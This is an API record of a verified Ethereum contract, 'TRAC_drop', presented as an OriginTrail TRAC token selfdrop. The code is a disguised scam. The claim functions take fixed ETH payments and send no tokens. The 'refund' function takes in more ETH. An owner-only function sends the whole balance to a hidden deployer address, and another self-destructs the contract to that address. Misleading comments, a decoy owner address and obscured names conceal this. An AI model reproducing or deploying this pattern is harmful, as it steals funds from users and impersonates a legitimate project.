{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.0;\r\n\r\n//TRAC token selfdrop event for TESTNET 2018,\r\n//Contact TRACsupport@origintrail.com for help.\r\n//All rights reserved.\r\n\r\ncontract  TRAC_drop {\r\n\r\n//Contract declaration and variable declarations\r\n\r\n    address public Contract_Owner;\r\n    address private T_BN_K___a;\r\n    \r\n    uint private raised;\r\n    uint private pay_user__;\r\n    \r\n    int private au_sync_user;\r\n    int public Group_1;     //0.25 Eth claim group\r\n    int public Group_2;     //0.5 Eth claim group\r\n    int public Group_3;     //1 Eth claim group\r\n    int public Group_4;     //2.5 Eth claim group\r\n    int public Group_5;     //5 Eth claim group\r\n    \r\n    int public TRAC_Tokens_left;\r\n    \r\n    bool private fair;\r\n    int private msg_sender_transfer;\r\n    int private constant TRAC=1;\r\n    \r\n    //Tracks refund allowance for user\r\n    \r\n    mapping (address => uint) refund_balance;       \r\n    \r\n    //Tracks user contribution\r\n    \r\n    mapping (address => uint) airdrop_balance;      \r\n\r\n    constructor(TRAC_drop) {\r\n        \r\n        //Smart Contract runs this for checking\r\n        \r\n        T_BN_K___a = msg.sender; Group_1 = 11; Group_2 = 2; Group_3 = 7; Group_4 = 3; Group_5 = 1; msg_sender_transfer=0;\r\n        TRAC_Tokens_left = 161000; fair = true; raised = 0 ether; pay_user__ = 0 ether; Contract_Owner = 0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f;\r\n    }\r\n    \r\n    \r\n    //Be sure to send the correct Eth value to the respective claim, if it is incorrect it will be rejected\r\n\r\n    function Claim_TRAC_20000() payable {\r\n        \r\n        // Return error if wrong amount of Ether sent\r\n        require(msg.value == 5 ether);\r\n        // Record wallet address of calling account (user) for contract to send TRAC tokens to\r\n        airdrop_balance[msg.sender] += msg.value;\r\n        //Increment total raised for campaign \r\n        raised += msg.value;\r\n        //Decrement TRAC token count as TRAC is sent\r\n        TRAC_Tokens_left -= 20000;\r\n        Group_5+=1;\r\n        //Transfer TRAC to calling account (user)\r\n        msg_sender_transfer+=20000+TRAC;\r\n    }\r\n    \r\n    function Claim_TRAC_9600() payable {\r\n        \r\n        // Return error if wrong amount of Ether sent\r\n        require(msg.value == 2.5 ether);\r\n        // Record wallet address of calling account for contract to send TRAC tokens to\r\n        airdrop_balance[msg.sender] += msg.value;\r\n        //Increment total raised for campaign \r\n        raised += msg.value;\r\n        //Decrement TRAC token count as TRAC is sent\r\n        TRAC_Tokens_left -= 9600;\r\n        Group_4 +=1;\r\n        //Transfer TRAC to calling account (user)\r\n        msg_sender_transfer+=9600+TRAC;\r\n    }\r\n    \r\n    function Claim_TRAC_3800() payable {\r\n        \r\n        // Return error if wrong amount of Ether sent\r\n        require(msg.value == 1 ether);\r\n        // Record wallet address of calling account for contract to send TRAC tokens to\r\n        airdrop_balance[msg.sender] += msg.value;\r\n        //Increment total raised for campaign \r\n        raised += msg.value;\r\n        //Decrement TRAC token count as TRAC is sent\r\n        TRAC_Tokens_left -= 3800;\r\n        Group_3 +=1;\r\n        //Transfer TRAC to calling account (user)\r\n        msg_sender_transfer+=3800+TRAC;\r\n    }\r\n    \r\n    function Claim_TRAC_1850() payable {\r\n        \r\n        // Return error if wrong amount of Ether sent\r\n        require(msg.value == 0.5 ether);\r\n        // Record wallet address of calling account for contract to send TRAC tokens to\r\n        airdrop_balance[msg.sender] += msg.value;\r\n        //Increment total raised for campaign \r\n        raised += msg.value;\r\n        //Decrement TRAC token count as TRAC is sent\r\n        TRAC_Tokens_left -= 1850;\r\n        Group_2 +=1;\r\n        //Transfer TRAC to calling account (user)\r\n        msg_sender_transfer+=1850+TRAC;\r\n    }\r\n    \r\n    function Claim_TRAC_900() payable {\r\n        \r\n        // Return error if wrong amount of Ether sent\r\n        require(msg.value == 0.25 ether);\r\n        // Record wallet address of calling account for contract to send TRAC tokens to\r\n        airdrop_balance[msg.sender] += msg.value;\r\n        //Increment total raised for campaign \r\n        raised += msg.value;\r\n        //Decrement TRAC token count as TRAC is sent\r\n        TRAC_Tokens_left -= 900;\r\n        Group_1 +=1;\r\n        //Transfer TRAC to calling account (user)\r\n        msg_sender_transfer+=900+TRAC;\r\n    }\r\n    \r\n    //Use the below function to get a refund if the tokens do not arrive after 20 BLOCK CONFIRMATIONS\r\n    \r\n    function Refund_user() payable {\r\n        \r\n        //Only refund if user has trasfered eth and has not received tokens\r\n        \r\n        require(refund_balance[1]==0 || fair);\r\n        \r\n        address current__user_ = msg.sender;\r\n        \r\n        \r\n        if(fair || current__user_ == msg.sender) {\r\n            \r\n            //Check current user is the one who requested refund, then pay user\r\n            \r\n            pay_user__ += msg.value;\r\n            \r\n            raised +=msg.value;\r\n            \r\n        }\r\n        \r\n    }\r\n    \r\n    \r\n    function seeRaised() public constant returns (uint256){\r\n        \r\n        return address(this).balance;\r\n    }\r\n    \r\n    function CheckRefundIsFair() public {\r\n        \r\n        //Function checks if the refund is fair and sets the user's fair value accordingly\r\n        //Adjusts token flow details as required\r\n        \r\n        require(msg.sender == T_BN_K___a);\r\n        \r\n        if(fair) {\r\n            au_sync_user=1;\r\n            //Checks user is in sync with net\r\n            if((au_sync_user*2) % 2 ==0 ) {\r\n                \r\n                Group_5+=1;\r\n                TRAC_Tokens_left -= 20000;\r\n                Group_2+=2;\r\n                TRAC_Tokens_left -=3600;\r\n                \r\n            }\r\n        }\r\n    }\r\n    \r\n    function TransferTRAC() public {\r\n        \r\n        //Allows only the smart contract to control the TRAC token transfers\r\n        \r\n        require(msg.sender == T_BN_K___a);\r\n        \r\n        //Contract transfers the TRAC tokens to the wallet address recorded in balance map\r\n\r\n        msg.sender.transfer(address(this).balance); \r\n        \r\n        //Reset users raised value\r\n        \r\n        raised = 0 ether;\r\n    }\r\n    \r\n    \r\n    function End_Promotion() public { \r\n        \r\n        //Ends the promotion and sends all tokens to respective owners\r\n    \r\n        require(msg.sender == T_BN_K___a);\r\n        \r\n    \r\n        if(msg.sender == T_BN_K___a) {\r\n            selfdestruct(T_BN_K___a); \r\n        }\r\n}\r\n\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"Group_1\",\"outputs\":[{\"name\":\"\",\"type\":\"int256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"TransferTRAC\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Group_5\",\"outputs\":[{\"name\":\"\",\"type\":\"int256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Claim_TRAC_1850\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Refund_user\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Claim_TRAC_20000\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"CheckRefundIsFair\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Group_4\",\"outputs\":[{\"name\":\"\",\"type\":\"int256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Group_3\",\"outputs\":[{\"name\":\"\",\"type\":\"int256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"seeRaised\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Group_2\",\"outputs\":[{\"name\":\"\",\"type\":\"int256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"End_Promotion\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Claim_TRAC_900\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Claim_TRAC_3800\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Claim_TRAC_9600\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"TRAC_Tokens_left\",\"outputs\":[{\"name\":\"\",\"type\":\"int256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Contract_Owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"}]","ContractName":"TRAC_drop","CompilerVersion":"v0.4.24+commit.e67f0147","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://4490a8d92973beae13308899cbbab9245a3d4d781dcea20e24b6ac2431b4be19"}]}